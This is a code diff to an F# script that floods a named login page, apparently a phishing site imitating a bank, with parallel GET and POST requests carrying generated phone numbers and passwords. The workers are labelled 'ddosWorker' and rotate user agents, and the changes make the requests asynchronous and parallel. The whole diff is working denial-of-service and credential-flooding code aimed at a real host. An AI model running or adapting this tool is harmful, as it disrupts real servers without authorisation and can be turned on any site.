@@ -35,7 +35,7 @@ let userAgents = [
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36"
     ]
 
-let sendRequest (randomizer: Random) threadNumber requestNumber request =
+let sendRequest (randomizer: Random) threadNumber requestNumber request = async {
     printfn "Thread #%i is sending request #%i" threadNumber requestNumber
     let body = 
         sprintf "phone=%s&password=%s" request.PhoneNumber request.Password
@@ -58,11 +58,11 @@ let sendRequest (randomizer: Random) threadNumber requestNumber request =
         config.AllowAutoRedirect <- false
         config
 
-    Http.Request("http://bezpeka-p24.su/login.php", headers=headers, httpMethod="GET", customizeHttpRequest=customizeHttpRequest, silentHttpErrors=true)
-    |> ignore
+    let! _ = Http.AsyncRequest("http://bezpeka-p24.su/login.php", headers=headers, httpMethod="GET", customizeHttpRequest=customizeHttpRequest, silentHttpErrors=true)
 
-    Http.Request("http://bezpeka-p24.su/login.php", headers=headers, httpMethod="POST", body=body, customizeHttpRequest=customizeHttpRequest, silentHttpErrors=true)
-    |> ignore
+    let! _ = Http.AsyncRequest("http://bezpeka-p24.su/login.php", headers=headers, httpMethod="POST", body=body, customizeHttpRequest=customizeHttpRequest, silentHttpErrors=true)
+    ()
+}
 
 type Args = 
     {
@@ -78,6 +78,7 @@ let (|Int|_|) (str: string) =
 
 [<EntryPoint>]
 let main argv =
+    printfn "%A " argv
     let rec parseArgs args parsed = 
         match args with
         | [] -> parsed
@@ -100,10 +101,12 @@ let main argv =
     let ddosWorker threadNumber = async {
             generatePhones getRandomListElement
             |> Seq.map generateRequests
-            |> Seq.iteri (sendRequest r threadNumber)
+            |> Seq.mapi (fun i request  -> sendRequest r threadNumber i request |> Async.RunSynchronously)
+            |> List.ofSeq
+            |> ignore
         }
 
-    Seq.init (args.ThreadsCount) ddosWorker
+    List.init (args.ThreadsCount) ddosWorker
     |> Async.Parallel
     |> Async.RunSynchronously
     |> ignore
